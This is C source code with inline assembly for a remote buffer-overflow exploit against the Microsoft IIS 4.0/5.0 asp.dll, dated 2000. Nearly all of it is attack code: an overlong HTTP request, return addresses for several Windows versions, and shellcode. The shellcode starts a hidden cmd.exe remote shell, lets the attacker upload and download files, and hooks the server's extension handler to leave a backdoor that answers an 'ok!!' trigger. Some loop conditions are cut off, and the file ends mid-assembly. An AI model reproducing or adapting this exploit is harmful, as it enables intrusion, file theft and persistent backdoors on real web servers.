//

//    asp.c  ver2.0 

//    iis4.0、iis5.0   asp.dll  overflow program

//   copy by yuange  2000.11.4

//   


// #define  DEBUG

//#define  RETEIPADDR  eipwin2000
#define  FNENDLONG  0x08
#define  NOPCODE  'B'    // INC EDX   0x90
#define  NOPLONG    0x50
#define  BUFFSIZE   0x20000
#define  PATHLONG   0x12

#define  RETEIPADDRESS 0x468

#define  SHELLBUFFSIZE 0x800 
#define  SHELLFNNUMS  14
#define  DATABASE     0x41
#define  DATAXORCODE  0x55
#define  LOCKBIGNUM   19999999
#define  LOCKBIGNUM2  13579139

#define  SHELLPORT   0x1f90   //0x1f90=8080 
#define  WEBPORT    80  

void    shellcodefnlock();
void    shellcodefnlock2();
void     shellcodefn(char *ecb);
void     shellcodefn2(char *ecb);

void     cleanchkesp(char *fnadd,char *shellbuff,char *chkespadd ,int len);

void     iisput(int fd,char *str);
void     iisget(int fd,char *str);
void     iiscmd(int fd,char *str);
void     iisreset();
void     iisdie();
void     iishelp();
int newrecv(int fd,char *buff,int size,int flag);
int newsend(int fd,char *buff,int size,int flag);


int xordatabegin;
int  lockintvar1,lockintvar2;
char lockcharvar;



int main(int argc, char **argv) { 
    char *server;
 
    char *str="LoadLibraryA""\x0"
        "CreatePipe""\x0"
        "CreateProcessA""\x0"
        "CloseHandle""\x0"
        "PeekNamedPipe""\x0"
        "ReadFile""\x0"
        "WriteFile""\x0"
        "CreateFileA""\x0"
        "GetFileSize""\x0"
        "GetLastError""\x0"
        "Sleep""\x0"
        "\x09""advapi32.dll""\x0"
        "CreateProcessAsUserA""\x0"
        "\x09""asp.dll""\x0"
        "HttpExtensionProc""\x0"
        "\x09""msvcrt.dll""\x0"
        "memcpy""\x0"
        "\x0"
        "cmd.exe""\x0"
        "\x0d\x0a""exit""\x0d\x0a""\x0"
        "XORDATA""\x0"
        "xordatareset""\x0"
        "strend";

    char buff0[]="TRACK / HTTP/1.1\nHOST:";
    char buff1[]="GET /";
    char buff2[]="default.asp";
    char buff3[]=".asp";
    char buff4[]="?!!ko HTTP/1.1 \nHOST:";
    char *buff2add;
    char *fnendstr="\x90\x90\x90\x90\x90\x90\x90\x90\x90";
    char SRLF[]="\x0d\x0a\x00\x00";  
       
    char  *eipexceptwin2000add;
    char  eipexceptwin20002[]="\x80\x70\x9f\x74";   //  push ebx ; ret  address 
    char  eipexceptwin2000cn[]="\x73\x67\xfa\x7F";   //  push ebx ; ret  address 
    char  eipexceptwin2000[]="\x80\x70\x97\x74";
    //    char  eipexceptwin2000[]="\xb3\x9d\xfa\x77";  // \x01\x78";   //  call ebx  address 
    char  eipexceptwin2000msvcrt[]="\xD3\xCB\x01\x78"; 
    char  eipexceptwin2000sp2[]="\x02\xbc\x01\x78"; 
    //    char  eipexceptwin2000[]="\x0B\x08\x5A\x68"; 
    //    char  eipexceptwin2000[]="\x32\x8d\x9f\x74";
    char  eipexceptwinnt[]  ="\x82\x01\xfc\x7F";    //  push esi ; ret  address 
    //    char  eipexceptwinnt[]  ="\x2e\x01\x01\x78";    //  call  esi  address
    //    char  eipexcept2[]="\xd0\xae\xdc\x77";  //  

    char  exceptret[]="\x6A\x01\x5b\x4b"  //  push 1; pop ebx ; dec ebx  // ebx=0
        "\x8b\x44\x24\x0c"  //  mov eax,[esp+c]
        "\x6a\x62"        //  push 62  
        "\x03\x04\x24"     //  add  eax,[esp]
        "\x03\x04\x24"
        "\x8b\x04\x18"     //  mov eax,[eax+ebx]
        "\x6a\x04"
        "\x03\x04\x24" 
        "\x8b\x04\x18"
        "\x6a\x1c"         // IIS5.0 "\x6a\x1c"  IIS4.0 "\x6a\x18"
        "\x03\x04\x24"
        "\x8b\x04\x18"
        "\x6a\x10"
        "\x03\x04\x24"
        "\x8b\x04\x18"
        "\x50\x5b"         //  push eax ; pop ebx   
        "\xff\x63\x64\x64"   //  jmp dword ptr [ebx+64]
        "\x0";

    char  exceptret2[]="\x6A\x01\x5b\x4b"   //  push 1; pop ebx ; dec ebx   // ebx=0
        "\x8b\x44\x24\x0c"  //  mov eax,[esp+c]
        "\x6a\x62"        //  push 62  
        "\x03\x04\x24"     //  add  eax,[esp]
        "\x03\x04\x24"
        "\x8b\x04\x18"     //  mov eax,[eax+ebx]
        "\x6a\x04"
        "\x03\x04\x24" 
        "\x8b\x04\x18"
        "\x6a\x1c"         // IIS5.0 "\x6a\x1c"  IIS4.0 "\x6a\x18"
        "\x03\x04\x24"
        "\x8b\x04\x18"
        "\x6a\x10"
        "\x03\x04\x24"
        "\x8b\x04\x18"
        "\x50\x5b"         //  push eax ; pop ebx   
        "\xff\x63\x64\x64"   //  jmp dword ptr [ebx+64]
        "\x0";

    char   buff[BUFFSIZE];
    char   recvbuff[BUFFSIZE];
    char   shellcodebuff[BUFFSIZE];
    struct  sockaddr_in s_in2,s_in3;
    struct  hostent *he;
    char   *shellcodefnadd,*chkespadd;
    unsigned  int sendpacketlong,buff2long,shelladd,packlong;

    int i,j,k,l,strheadlong;
    unsigned  char temp;
    int    fd;
    u_short port,port1,shellcodeport;
    SOCKET  d_ip;
    WSADATA wsaData;
    int offset=0;
    int OVERADD=RETEIPADDRESS;
    int result;

 

    fprintf(stderr,"\n IIS4.0 OVERFLOW PROGRAM 2.0 .");
    fprintf(stderr,"\n copy by yuange 2000.6.2.");
    fprintf(stderr,"\n welcome to my homepage http://yuange.yeah.net .");
    fprintf(stderr,"\n welcome  to http://www.nsfocus.com .");
 
    buff2add=buff2;
    if(argc <2){
        fprintf(stderr,"\n please enter the web server:");
        gets(recvbuff);
        /* for(i=0;i */
        /*         if(recvbuff[i]!=' ') break; */
        /*     } */

        /* server=recvbuff; */
        /* if(i */

        /*    fprintf(stderr,"\n please enter the .asp filename:"); */
        /*    gets(shellcodebuff); */
        /*    for(i=0;i */
        /*            if(shellcodebuff[i]!=' ') break; */
        /*        } */

        /*    buff2add=shellcodebuff+i; */
        /*    printf("\n .asp file name:%s\n",buff2add); */
        /*    } */

        eipexceptwin2000add=eipexceptwin2000;
        // printf("\n argc%d argv%s",argc,argv[5]);
        if(argc>5){
            if(strcmp(argv[5],"cn")==0) {
                eipexceptwin2000add=eipexceptwin2000cn;
                printf("\n For the cn system.\n");  
            }
            if(strcmp(argv[5],"sp0")==0) {
                eipexceptwin2000add=eipexceptwin20002;
                printf("\n For the sp0 system.\n");  
            }
            if(strcmp(argv[5],"msvcrt")==0) {
                eipexceptwin2000add=eipexceptwin2000msvcrt;
                printf("\n Use msvcrt.dll JMP to shell.\n");  
            }
            if(strcmp(argv[5],"sp2")==0) {
                eipexceptwin2000add=eipexceptwin2000sp2;
                printf("\n Use sp2 msvcrt.dll JMP to shell.\n");  
            }
        } 

        result= WSAStartup(MAKEWORD(1, 1), &wsaData);
        if (result != 0) {
            fprintf(stderr, "Your computer was not connected "
                    "to the Internet at the time that "
                    "this program was launched, or you "
                    "do not have a 32-bit "
                    "connection to the Internet.");
            exit(1);
        }

        if(argc>4){
            offset=atoi(argv[4]);
        }
        OVERADD+=offset;
        packlong=0x10000-offset+0x8;

 
        if(argc <2){
            //    WSACleanup( );
//    exit(1);
        } else {
            server = argv[1];
        }

        /* for(i=0;i */
        /*         if(server[i]!=' ') */
        /*             break; */
        /*     } */
        /* if(i */

        /*    for(i=0;i+3 */
  
        /*            if(server[i]==':'){ */
        /*                if(server[i+1]=='\\'||server[i+1]=='/'){ */
        /*                    if(server[i+2]=='\\'||server[i+2]=='/'){ */
        /*                        server+=i; */
        /*                        server+=3; */
        /*                        break; */
        /*                    } */
        /*                } */
        /*            } */
        /*            } */
        /*    for(i=1;i<=strlen(server);++i){ */
        /*        if(server[i-1]=='\\'||server[i-1]=='/') server[i-1]=0; */
        /*    } */
 
        /*    d_ip = inet_addr(server); */
        /*    if(d_ip==-1){ */
        /*        he = gethostbyname(server); */
        /*        if(!he) */
        /*        { */
        /*            WSACleanup( ); */
        /*            printf("\n Can't get the ip of %s !\n",server); */
        /*            gets(buff); */
        /*            exit(1);   */
        /*        } */
        /*        else   memcpy(&d_ip, he->h_addr, 4); */
        /*    }   */
  
        if(argc>3) port=atoi(argv[3]);
        else   port=WEBPORT;
        if (port==0) port=WEBPORT;

        fd = socket(AF_INET, SOCK_STREAM,0);
        i=8000;
        setsockopt(fd,SOL_SOCKET,SO_RCVTIMEO,(const char *) &i,sizeof(i));
     
        s_in3.sin_family = AF_INET;
        s_in3.sin_port = htons(port);
        s_in3.sin_addr.s_addr = d_ip;
        printf("\n nuke ip: %s port %d", inet_ntoa(s_in3.sin_addr),htons(s_in3.sin_port));
  
        if(connect(fd, (struct sockaddr *)&s_in3, sizeof(struct sockaddr_in))!=0)
        {
            closesocket(fd);
            WSACleanup( );
            fprintf(stderr,"\n  connect err.");
            gets(buff);
            exit(1);
        }
  
        _asm{
            mov ESI,ESP
                cmp ESI,ESP
                }
        _chkesp();
        chkespadd=_chkesp;
        temp=*chkespadd;
        if(temp==0xe9) {
            ++chkespadd;
            i=*(int*)chkespadd;
            chkespadd+=i;
            chkespadd+=4;
        }

        memset(buff,NOPCODE,BUFFSIZE);

        strcpy(buff,buff1);

        strheadlong=strlen(buff);
        OVERADD+=strheadlong-1;

  
        if(argc>2) buff2add=argv[2];

        for(;;++buff2add){
            temp=*buff2add;
            if(temp!='\\'&&temp!='/') break;
        }
// printf("\nfile:%s",buff2add);

        buff2long=strlen(buff2add);

        memcpy(buff+strheadlong,buff2add,buff2long);
        memset(buff+strheadlong+buff2long,'.',0x10);   
 
        temp=buff[strheadlong+buff2long-1];
        if(temp!='\\'&temp!='/') memset(buff+strheadlong+buff2long,'.',1);

        // strcpy(buff,buff1);
        // memset(buff+strlen(buff),NOPCODE,1);

        fprintf(stderr,"\n offset:%d\n",offset);

        offset+=strheadlong-strlen(buff1); 

   

        for(i=0x124;i<=0x200;i+=8){
            memcpy(buff+offset+i,"\x42\x42\x42\x2d",4);  //  0x2d  sub eax,num32
            memcpy(buff+offset+i+4,eipexceptwin2000add,4);
        }    
        for(i=0x404;i<=0x500;i+=8){
            memcpy(buff+offset+i,"\x42\x42\x42\x2d",4);  //  0x2d  sub eax,num32
            memcpy(buff+offset+i+4,eipexceptwin2000add,4);
        }
        if(argc>5){
            if(strcmp(argv[5],"sp2")==0) {
                memcpy(buff+offset+i,"\x58",1);
            }
        }

        for(i=0x220;i<=0x380;i+=8){
            memcpy(buff+offset+i,"\x42\x42\x42\x2d",4);  //  0x2d  sub eax,num32
            memcpy(buff+offset+i+4,eipexceptwinnt,4);
        }    
        for(i=0x580;i<=0x728;i+=8){
            memcpy(buff+offset+i,"\x42\x42\x42\x2d",4);  //  0x2d  sub eax,num32
            memcpy(buff+offset+i+4,eipexceptwinnt,4);
        }    


        // winnt 0x2cc or 0x71c  win2000 0x130 or 0x468 
 
 
 
        //  memcpy(buff+offset+i+8,exceptret,strlen(exceptret));


        shellcodefnadd=shellcodefnlock;
        temp=*shellcodefnadd;
        if(temp==0xe9) {
            ++shellcodefnadd;
            k=*(int *)shellcodefnadd;
            shellcodefnadd+=k;
            shellcodefnadd+=4;
        }

        for(k=0;k<=0x500;++k){
            if(memcmp(shellcodefnadd+k,fnendstr,FNENDLONG)==0) break;
        }
    
        memcpy(buff+offset+i+4,shellcodefnadd+k+8,0x100);
 
        shellcodefnadd=shellcodefn;
        temp=*shellcodefnadd;
        if(temp==0xe9) {
            ++shellcodefnadd;
            k=*(int *)shellcodefnadd;
            shellcodefnadd+=k;
            shellcodefnadd+=4;
        }
  

        for(k=0;k<=BUFFSIZE;++k){
            if(memcmp(shellcodefnadd+k,fnendstr,FNENDLONG)==0) break;
        }
//  k+=0x



        memcpy(shellcodebuff,shellcodefnadd,k);   //j);
        cleanchkesp(shellcodefnadd,shellcodebuff,chkespadd,k);
        for(j=0;j<0x400;++j){ 
            if(memcmp(str+j,"strend",6)==0) break;
        }  
        memcpy(shellcodebuff+k,str,j);
        sendpacketlong=k+j;

        for(k=0;k<=0x200;++k){
            if(memcmp(buff+offset+i+4+k,fnendstr,FNENDLONG)==0) break;
        }
        // fprintf(stderr,"\n send:\n %s",buff);
   
//  printf("\nbuff:%s\n",buff);
        offset+=i;
 
        for(j=0;j
                temp=shellcodebuff[j];
//  temp^=DATAXORCODE;
            buff[offset+4+k]=DATABASE+temp/0x10;
            ++k;
            buff[offset+4+k]=DATABASE+temp%0x10;
            ++k;
            }

// printf("\nbuff:%s",buff);
        printf("\n shellcode long 0x%x\n",sendpacketlong);

//  sendpacketlong=k+0x20;
        //  sendpacketlong=0x040;

        sendpacketlong=packlong+strheadlong;
        sendpacketlong+=buff2long;

 

        strcpy(buff+sendpacketlong-strlen(buff3),buff3);
        printf("\n packetlong:0x%x\n",sendpacketlong);
        strcpy(buff+sendpacketlong,buff4);
        if(argc>6) strcpy(buff+sendpacketlong+strlen(buff4),argv[6]);
        else  strcpy(buff+sendpacketlong+strlen(buff4),server);
        strcpy(buff+sendpacketlong+strlen(buff4)+strlen(server),"\r\n\r\n\n");
// printf("\n send buff:\n%s",buff);
//  strcpy(buff+OVERADD+NOPLONG,shellcode);
        sendpacketlong=strlen(buff);
//  printf("buff:\n%s",buff+0x10000);



        lockintvar1=LOCKBIGNUM2%LOCKBIGNUM;
        lockintvar2=lockintvar1;


        xordatabegin=0;
        for(i=0;i<1;++i){ 
            j=sendpacketlong;
//  buff[0x2000]=0;
            fprintf(stderr,"\n send  packet %d bytes.",j);

//  gets(buff);
            send(fd,buff,j,0);
   
            k=0;
            ioctlsocket(fd, FIONBIO, &k);

            j=0;
            while(j==0){
                k=newrecv(fd,recvbuff,BUFFSIZE,0);
                if(k>=8&&strstr(recvbuff,"XORDATA")!=0) {
                    xordatabegin=1;
                    fprintf(stderr,"\n ok!recv %d bytes\n",k);
                    recvbuff[k]=0;
// printf("\n recv:%s",recvbuff);
// for(k-=0,j=0;k>0;k-=4,++j)printf("recvdata:0x%x\n",*(int *)(recvbuff+4*j));
                    k=-1;
                    j=1;
                }
                if(k>0){
                    recvbuff[k]=0;
                    fprintf(stderr,"\n  recv:\n %s",recvbuff);
                }
            }

        }

        k=1;
        ioctlsocket(fd, FIONBIO, &k);

        // fprintf(stderr,"\n now begin: \n");

 

        k=1;
        l=0;
        while(k!=0){
            if(k<0){

                l=0;
                i=0;
                while(i==0){
                    gets(buff);

                    if(memcmp(buff,"iish",4)==0){
                        iishelp();
                        i=2;
                    }

                    if(memcmp(buff,"iisput",6)==0){
                        iisput(fd,buff+6);
                        i=2;
                    }
                    if(memcmp(buff,"iisget",6)==0){
                        iisget(fd,buff+6);
                        i=2;
                    }
                    if(memcmp(buff,"iiscmd",6)==0){
                        iiscmd(fd,buff+6);
                        i=2;
                    }
                    if(memcmp(buff,"iisreset",8)==0){
                        iisreset(fd,buff+6);
                        i=2;
                    }
                    if(memcmp(buff,"iisdie",6)==0){
                        iisdie(fd,buff+6);
                        i=2;
                    }


                    if(i==2)i=0;
                    else i=1;

                }

                k=strlen(buff);
    
                memcpy(buff+k,SRLF,3);
//   send(fd,SRLF,strlen(SRLF),0);
                //   fprintf(stderr,"%s",buff);
                newsend(fd,buff,k+2,0);

//      send(fd,SRLF,strlen(SRLF),0);
            }
            k=newrecv(fd,buff,BUFFSIZE,0);
            if(xordatabegin==0&&k>=8&&strstr(buff,"XORDATA")!=0) {
                xordatabegin=1;
                k=-1;
            }

            if(k>0){
//   fprintf(stderr,"recv %d bytes",k);

                l=0;
                buff[k]=0;
                fprintf(stderr,"%s",buff);
            }
            else{
                Sleep(20);
                if(l<20) k=1;
                ++l;
  
            }


//   if(k==0) break;
        }  
        closesocket(fd);
        WSACleanup( );
        fprintf(stderr,"\n the server close connect.");
        gets(buff);
        return(0);
    }

}
}





void  shellcodefnlock()
{
    _asm{
        nop
            nop
            nop
            nop
            nop
            nop
            nop
            nop

//   pop  eax
//   pop  eax
//   pop  eax
            mov  esi,dword ptr [esp+0xc]


            next:   push esi
            add  dword ptr [esp],0x50
            pop  esi
            mov  esi,dword ptr[esi+0x50]
            loopdec:   dec  esi
            cmp  dword ptr [esi],0x90909090
            jnz  loopdec
            push esi
            pop  ebx
            push esi
            jmp  dword ptr [esp]
            nop
            nop
            nop
            nop
            push 0x48486141
            add  dword ptr [esp],0x48486215;
        push 0x41412c2e
            add  dword ptr [esp],0x15152c30
            push 0x76765562
            add  dword ptr [esp],0x76755562
            push 0x02412c56
            add  byte  ptr [esp],0x56
            push 0x70450270
            add  dword ptr [esp],0x70450270  
            push 0x60301608
            add  dword ptr [esp],0x60111607
            push 0x72013c56
            add  byte  ptr [esp],0x56
            push 0x5f56565e
            push esp
            pop  esi
            push ebx        //  ecb 
            push ebx        //  the call return add 
            push esi
            call dword ptr [esp]
            NOP
            NOP
            NOP
            NOP
            NOP
            NOP
            NOP
            NOP
  
            }
}  
 




void shellcodefn(char *ecb)
{ char       Buff[SHELLBUFFSIZE+2];
    int        *except[3];


    FARPROC     memcpyadd;
    FARPROC    msvcrtdlladd;
    FARPROC     HttpExtensionProcadd;
    FARPROC     Aspdlladd;
    FARPROC    CreateProcessAsUserAadd;
    FARPROC    Advapi32dlladd;

    FARPROC     Sleepadd;
    FARPROC     GetLastErroradd;
    FARPROC     GetFileSizeadd;
    FARPROC    CreateFileAadd;
    FARPROC    WriteFileadd;
    FARPROC    ReadFileadd;
    FARPROC    PeekNamedPipeadd;
    FARPROC    CloseHandleadd;
    FARPROC    CreateProcessadd;
    FARPROC    CreatePipeadd;
    FARPROC    procloadlib;

    FARPROC    apifnadd[1];
    FARPROC    procgetadd=0;
    FARPROC     writeclient;
    FARPROC     readclient;
    HCONN      ConnID;
    FARPROC    shellcodefnadd=ecb;
    char       *stradd,*stradd2,*dooradd;
    int        imgbase,fnbase,i,k,l,thedoor;
    HANDLE     libhandle;
    int        fpt;   //libwsock32;  
    STARTUPINFO siinfo;

    PROCESS_INFORMATION ProcessInformation;
    HANDLE     hReadPipe1,hWritePipe1,hReadPipe2,hWritePipe2;
    int        lBytesRead;
    int  lockintvar1,lockintvar2;
    char lockcharvar;
    int  shelllocknum;
// unsigned char temp;
    SECURITY_ATTRIBUTES sa;
     

    _asm {          jmp   nextcall
            getstradd:  pop    stradd
            lea   EDI,except
            mov   eax,dword ptr FS:[0]
            mov   dword ptr [edi+0x08],eax
            mov   dword ptr FS:[0],EDI
            }
    except[0]=0xffffffff;
    except[1]=stradd-0x07;

    imgbase=0x77e00000;
    _asm{
        call getexceptretadd
            }
    for(;imgbase<0xbffa0000,procgetadd==0;){
        imgbase+=0x10000;
        if(imgbase==0x78000000) imgbase=0xbff00000;
        if(*( WORD *)imgbase=='ZM'&& *(WORD *)(imgbase+*(int *)(imgbase+0x3c))=='EP'){
            fnbase=*(int *)(imgbase+*(int *)(imgbase+0x3c)+0x78)+imgbase;
            k=*(int *)(fnbase+0xc)+imgbase;
            if(*(int *)k =='NREK'&&*(int *)(k+4)=='23LE'){
                libhandle=imgbase;
                k=imgbase+*(int *)(fnbase+0x20);
                for(l=0;l<*(int *) (fnbase+0x18);++l,k+=4){
                    if(*(int *)(imgbase+*(int *)k)=='PteG'&&*(int *)(4+imgbase+*(int *)k)=='Acor')
                    {
                        k=*(WORD *)(l+l+imgbase+*(int *)(fnbase+0x24));
                        k+=*(int *)(fnbase+0x10)-1;
                        k=*(int *)(k+k+k+k+imgbase+*(int *)(fnbase+0x1c));
                        procgetadd=k+imgbase;
                        break;
                    }
                }
            }
        }
    }
//搜索KERNEL32。DLL模块地址和API函数 GetProcAddress地址
//注意这儿处理了搜索页面不在情况。

    if(procgetadd==0) goto  die ;

    i=stradd;  

    for(k=1;*stradd!=0;++k) {
        if(*stradd==0x9) libhandle=procloadlib(stradd+1);
        else    apifnadd[k]=procgetadd(libhandle,stradd);
        for(;*stradd!=0;++stradd){
        }
        ++stradd;
    }
    ++stradd;

    k=stradd;
    stradd=i;
    thedoor=0;

    i=0;
    _asm{
        jmp  getdoorcall
            getdooradd:     pop  dooradd;
        mov  l,esp
            call getexceptretadd
            }
    if(i==0){
        ++i;
        if(*(int *)ecb==0x90){
            if(*(int *)(*(int *)(ecb+0x64))=='ok!!') {
                i=0;
                thedoor=1;
            }
        } 
    }

    if(i!=0){
        *(int *)(dooradd-0x0c)=HttpExtensionProcadd;
        *(int *)(dooradd-0x13)=shellcodefnadd;
        ecb=0;
        _asm{
            call getexceptretadd
                }
        i=ecb;
        i&=0xfffff000;
        ecb=i;
        ecb+=0x1000; 

        for(;i
            {
                if(*(int *)ecb==0x90){
                    if(*(int *)(ecb+8)==(int *)ecb){
                        if(*(int *)*(int *)(ecb+0x64)=='ok!!') break;

                    }
                } 
            } 



                i=0;
            _asm{
                call getexceptretadd
                    }
 
                i&=0xfffff000;
            i+=0x1000;
            for(;i
                    if(*(int *)i==HttpExtensionProcadd){
                        *(int *)i=dooradd-7;
                        // break;
                    }
                    }
                *(int *)(dooradd-0x0c)=HttpExtensionProcadd;

  
            }


        writeclient= *(int *)(ecb+0x84);
        readclient = *(int *)(ecb+0x88);
        ConnID     = *(int *)(ecb+8) ;

        stradd=k;
 

        _asm{
            lea edi,except
                mov eax,dword ptr [edi+0x08]   
                mov dword ptr fs:[0],eax
                }
        if(thedoor==0){
            _asm{
                mov eax,0xffffffff
                    mov dword ptr fs:[0],eax 
                    mov eax,dword ptr fs:[0x18]
                    mov i,eax
                    }

        }

        stradd2=stradd;
        stradd+=8;
        k=0x20;
        writeclient(ConnID,*(int *)(ecb+0x6c),&k,0);
      
     
        k=8;
        writeclient(ConnID,stradd+9,&k,0);
 
        shelllocknum=LOCKBIGNUM2;
        if(*(int *)*(int *)(ecb+0x64)=='ok!!'&&*(int *)(*(int *)(ecb+0x64)+4)=='notx') shelllocknum=0;

   
// iiscmd:
        lockintvar1=shelllocknum%LOCKBIGNUM;
        lockintvar2=lockintvar1;
 
    iiscmd:




        sa.nLength=12;
        sa.lpSecurityDescriptor=0;
        sa.bInheritHandle=TRUE;
 
        CreatePipeadd(&hReadPipe1,&hWritePipe1,&sa,0);
        CreatePipeadd(&hReadPipe2,&hWritePipe2,&sa,0);


// ZeroMemory(&siinfo,sizeof(siinfo));
        _asm{
            lea EDI,siinfo
                xor eax,eax
                mov ecx,0x11
                repnz stosd
                }
        siinfo.dwFlags = STARTF_USESHOWWINDOW|STARTF_USESTDHANDLES;
        siinfo.wShowWindow = SW_HIDE;
        siinfo.hStdInput = hReadPipe2;
        siinfo.hStdOutput=hWritePipe1;
        siinfo.hStdError =hWritePipe1;
        k=0;
// while(k==0)
//   {

// k=CreateProcessadd(NULL,stradd2,NULL,NULL,1,0,NULL,NULL,&siinfo,&ProcessInformation);

        for(i=0;i<0x1000&k==0;i+=4){
            k=CreateProcessAsUserAadd(i,NULL,stradd2,NULL,NULL,1,0,NULL,NULL,&siinfo,&ProcessInformation);
        }
        k=GetLastErroradd();
//       stradd+=8;
// }

        Sleepadd(200);
// PeekNamedPipeadd(hReadPipe1,Buff,SHELLBUFFSIZE,&lBytesRead,0,0);
 

 
// k=0x20;
// writeclient(ConnID,*(int *)(ecb+0x64),&k,0);
//   writeclient(ConnID,*(int *)(ecb+0x68),&k,0);
 
   
     
        i=0;
        while(1) {
            PeekNamedPipeadd(hReadPipe1,Buff,SHELLBUFFSIZE,&lBytesRead,0,0);
            if(lBytesRead>0) {
                i=0; 
                ReadFileadd(hReadPipe1,Buff,lBytesRead,&lBytesRead,0);
                if(lBytesRead>0) {
                    for(k=0;k
                            lockintvar2=lockintvar2*0x100;
                        lockintvar2=lockintvar2%LOCKBIGNUM;
                        lockcharvar=lockintvar2%0x100;
                        Buff[k]^=lockcharvar;   // DATAXORCODE;
//              Buff[k]^=DATAXORCODE;
                        }
                    writeclient(ConnID,Buff,&lBytesRead,0); // HSE_IO_SYNC);
//    Sleepadd(20);
                } 
            }
            else{

                Sleepadd(10);
                l=0;
                if(i<50){
                    l=1;
                    ++i;
                    k=1;
                    lBytesRead=0;
                }
     


          
                while(l==0){
                    i=0;
                    lBytesRead=SHELLBUFFSIZE;
                    k=readclient(ConnID,Buff,&lBytesRead);

                    for(l=0;l
                            lockintvar1=lockintvar1*0x100;
                        lockintvar1=lockintvar1%LOCKBIGNUM;
                        lockcharvar=lockintvar1%0x100;
                        Buff[l]^=lockcharvar;   // DATAXORCODE;
                        }
                    if(k==1&&lBytesRead>=5&&Buff[0]=='i'&&Buff[1]=='i'&&Buff[2]=='s'&&Buff[3]=='c'&&Buff[4]==' '){
                        k=8;
                        WriteFileadd(hWritePipe2,stradd,k,&k,0); // exit cmd.exe
                        WriteFileadd(hWritePipe2,stradd,k,&k,0); // exit cmd.exe
                        stradd2=Buff+5;
                        Buff[lBytesRead]=0;
                        goto iiscmd;

                    }
                    if(k==1&&lBytesRead>=5&&Buff[0]=='r'&&Buff[1]=='e'&&Buff[2]=='s'&&Buff[3]=='e'&&Buff[4]=='t'){
      
                        lBytesRead=0x0c;
                        writeclient(ConnID,stradd+0x11,&lBytesRead,0);

                        lockintvar1=shelllocknum%LOCKBIGNUM;
                        lockintvar2=lockintvar1;
                        lBytesRead=0;
                    }
                    if(k==1&&lBytesRead>=5&&Buff[0]=='i'&&Buff[1]=='i'&&Buff[2]=='s'&&Buff[3]=='r'&&Buff[4]=='r'){
                        k=8;
                        WriteFileadd(hWritePipe2,stradd,k,&k,0); // exit cmd.exe
                        WriteFileadd(hWritePipe2,stradd,k,&k,0); // exit cmd.exe

                        *(int *)(dooradd-0x0c)=0;
                        Sleepadd(0x7fffffff);      
                        _asm{
                            mov eax,0
                                mov esp,0
                                jmp eax
                                }    
                    }

               

                    if(k==1&&lBytesRead>4&&Buff[0]=='p'&&Buff[1]=='u'&&Buff[2]=='t'&&Buff[3]==' ')
                    {
                        l=*(int *)(Buff+4);
//  WriteFileadd(fpt,Buff,lBytesRead,&lBytesRead,NULL); 

                        fpt=CreateFileAadd(Buff+0x8,FILE_FLAG_WRITE_THROUGH+GENERIC_WRITE,FILE_SHARE_READ,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,0);
                        k=GetLastErroradd();
                        i=0;
                        while(l>0){
                            lBytesRead=SHELLBUFFSIZE;
                            k=readclient(ConnID,Buff,&lBytesRead);
                            if(k==1){
                                if(lBytesRead>0){

                                    for(k=0;k
                                            lockintvar1=lockintvar1*0x100;
                                        lockintvar1=lockintvar1%LOCKBIGNUM;
                                        lockcharvar=lockintvar1%0x100;
                                        Buff[k]^=lockcharvar;   // DATAXORCODE;
                                        }
                                    l-=lBytesRead;
//  if(fpt>0)
                                    WriteFileadd(fpt,Buff,lBytesRead,&lBytesRead,NULL);
//  else Sleepadd(010);
                                }
  
//    if(i>100) l=0;
                            }
                            else {
                                Sleepadd(0100);
                                ++i;
                            } 
                            if(i>10000) l=0;
                        }
       
                        CloseHandleadd(fpt);
                        l=0;
                    }
                    else{
                        if(k==1&&lBytesRead>4&&Buff[0]=='g'&&Buff[1]=='e'&&Buff[2]=='t'&&Buff[3]==' '){
 
// fpt=CreateFileAadd(Buff+4,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0); 
                  
                            fpt=CreateFileAadd(Buff+4,GENERIC_READ,FILE_SHARE_READ+FILE_SHARE_WRITE,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0); 
                            Sleepadd(100);
                            l=GetFileSizeadd(fpt,&k);
                            *(int *)Buff='ezis';      //size
                            *(int *)(Buff+4)=l;
                            lBytesRead=8;

                            for(i=0;i
                                    lockintvar2=lockintvar2*0x100;
                                lockintvar2=lockintvar2%LOCKBIGNUM;
                                lockcharvar=lockintvar2%0x100;
                                Buff[i]^=lockcharvar;   // DATAXORCODE;
                                }
 


                            writeclient(ConnID,Buff,&lBytesRead,0); // HSE_IO_SYNC);
                            //     Sleepadd(100);
                            i=0;
                            while(l>0){
                                k=SHELLBUFFSIZE; 
                                ReadFileadd(fpt,Buff,k,&k,0);
                                if(k>0){
                                    for(i=0;i
                                            lockintvar2=lockintvar2*0x100;
                                        lockintvar2=lockintvar2%LOCKBIGNUM;
                                        lockcharvar=lockintvar2%0x100;
                                        Buff[i]^=lockcharvar;   // DATAXORCODE;
                                        }
 
                                    i=0;
                                    l-=k;
                                    writeclient(ConnID,Buff,&k,0); // HSE_IO_SYNC);
//                              Sleepadd(100);             
                                    //                k=readclient(ConnID,Buff,&lBytesRead);
               
                                }
                                else ++i;
                                if(i>100) l=0;
                            }
                            CloseHandleadd(fpt);

                            l=0;
                        }
                        else l=1;
                    }


                }


                if(k!=1){
                    k=8;
                    WriteFileadd(hWritePipe2,stradd,k,&k,0); // exit cmd.exe
                    WriteFileadd(hWritePipe2,stradd,k,&k,0); // exit cmd.exe
                    WriteFileadd(hWritePipe2,stradd,k,&k,0); // exit cmd.exe
                    k=GetLastErroradd();
                    while(k==0x2746){
                        if(thedoor==1)   goto asmreturn; 
                        Sleepadd(0x7fffffff);               //僵死  
                    }
          
                }
                else{
                    WriteFileadd(hWritePipe2,Buff,lBytesRead,&lBytesRead,0);
                    //     Sleepadd(1000);
                }
            }
        }
    die: goto die  ;

        _asm{

        asmreturn:        
            mov eax,HSE_STATUS_SUCCESS
                leave
                ret 04

                door:            push eax
                mov eax,[esp+0x08]
                mov eax,[eax+0x64]
                mov eax,[eax]
                cmp eax,'ok!!'
                jnz jmpold
                pop eax
                push 0x12345678  //dooradd-0x13
                ret       

                jmpold:    pop  eax
            push 0x12345678   //dooradd-0xc
            ret             //1
            jmp  door        //2
            getdoorcall:    call getdooradd   //5
 

            getexceptretadd:   pop  eax
            push eax
            mov  edi,dword ptr [stradd]
            mov dword ptr [edi-0x0e],eax
            ret
            errprogram:    mov eax,dword ptr [esp+0x0c]
            add eax,0xb8
